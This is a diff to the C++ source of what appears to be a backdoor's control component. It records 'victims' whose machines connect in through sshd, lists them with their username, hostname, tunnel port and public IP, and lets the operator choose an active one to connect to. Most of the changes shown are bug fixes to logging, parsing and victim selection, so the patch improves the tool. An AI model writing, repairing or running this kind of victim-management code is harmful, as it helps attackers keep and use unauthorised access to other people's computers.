@@ -102,7 +102,13 @@ void log(const char* text) {
 
     FILE* f = fopen(LOG_PATH, "a");
 
-    fprintf(f, "LOG %s - %s\n", ts, text);
+    if (f == NULL) {
+        printf("Error opening %s\n", LOG_PATH);
+        perror("The following error occurred");
+        return;
+    }
+
+    fprintf(f, "[LOG] %s - %s\n", ts, text);
     fclose(f);
 
 }
@@ -173,14 +179,30 @@ int log_new_victim(int argc, char** argv) {
     // called by Cid
   //  log("log_new_victim");
     printf("called by sshd\n");
+    
+    // sshd is executing -c "command" so argc should be 3
+    if (argc != 3) {
+        char tmp[100] = { 0 };
+        snprintf(tmp, sizeof tmp, "Got a different number of arguments than expected (3) got %d\n", argc);
+        log(tmp);
+        return 1;
+    }
+    printf("called by sshd\n");
     FILE* f = fopen(LOG_PATH, "a");
-    // sshd is executing -c "command"
+    if (f == NULL) {
+        printf("Error opening %s\n", LOG_PATH);
+        perror("The following error occurred");
+        return 1;
+    }
+  
     char ts[301] = { 0 };
     get_timestamp(ts);
     vector<string> v = split(argv[2], DELIMETER);
 
     if (v.size() != 3) {
-        printf("Some error happened spliting %s\n", argv[2]);
+        char tmp[500] = { 0 };
+        snprintf(tmp, sizeof tmp, "Some error happened spliting %s\n", argv[2]);
+        log(tmp);
         fclose(f);
         return 1;
     }
@@ -297,14 +319,22 @@ int show_existent_victims() {
     print_banner();
     std::ifstream infile(LOG_PATH);
     std::vector<std::tuple<tm, std::string, std::string, unsigned int, std::string, bool>> log_vector;
-    std::string date, username1, hostname, public_IP;
+    
     unsigned int port;
     tm ts = { 0 };
-    while (infile >> date >> username1 >> hostname >> port >> public_IP)
+
+    std::string line;
+    while (std::getline(infile, line))
     {
-        std::istringstream ss(date);
-        ss >> std::get_time(&ts, TIME_FORMAT);
-        if (ss.fail()) {
+        std::istringstream iss(line);
+        std::string date, username1, hostname, public_IP;
+        if (!(iss >> date >> username1 >> hostname >> port >> public_IP)) {
+            continue; //can't parse this line 
+        } 
+        // parsing went fine. Last step parse time
+        std::istringstream parsed_date(date);
+        parsed_date >> std::get_time(&ts, TIME_FORMAT);
+        if (parsed_date.fail()) {
             std::cout << "Parse failed\n";
             continue;
         }
@@ -313,6 +343,20 @@ int show_existent_victims() {
         }
         log_vector.push_back(std::make_tuple(ts, username1, hostname, port, public_IP, false));
     }
+
+    //while (infile >> date >> username1 >> hostname >> port >> public_IP)
+    //{
+    //    std::istringstream ss(date);
+    //    ss >> std::get_time(&ts, TIME_FORMAT);
+    //    if (ss.fail()) {
+    //        std::cout << "Parse failed\n";
+    //        continue;
+    //    }
+    //    else {
+    //        // std::cout << std::put_time(&ts, "%c") << '\n';
+    //    }
+    //    log_vector.push_back(std::make_tuple(ts, username1, hostname, port, public_IP, false));
+    //}
 
     // sort descendent by time
     std::sort(log_vector.begin(), log_vector.end(), compareByTime);
@@ -332,9 +376,12 @@ int show_existent_victims() {
     if (selection.empty()) {
         return 0;
     }
+   
     if (isInteger(selection) &&
-        std::stoi(selection) < log_vector.size() &&
-        std::get<5>(log_vector[std::stoi(selection) - 1]) == true /*check if connection is active*/) {
+        std::stoi(selection) <= log_vector.size() &&
+        std::get<5>(log_vector[std::stoi(selection) - 1]) == true /*check if connection is active*/
+        ) 
+    {
 
         auto port_ptr = std::to_string(std::get<3>(log_vector[std::stoi(selection) - 1])).c_str();
         
@@ -355,10 +402,12 @@ int main(int argc, char** argv) {
     const int ppid = 1;
 #endif
     const char* parent_name = get_process_name_by_pid(ppid);
+    char* coso =  "default$DESKTOP-Q4FDM2G$1234";
     //    log("at main");
     //printf("pid is %d %s\n", ppid, parent_name);
 
     if (strncmp(parent_name, "sshd", 4) == 0) {
+        //alog_new_victim(2, &coso);
         log_new_victim(argc, argv);
     }
 
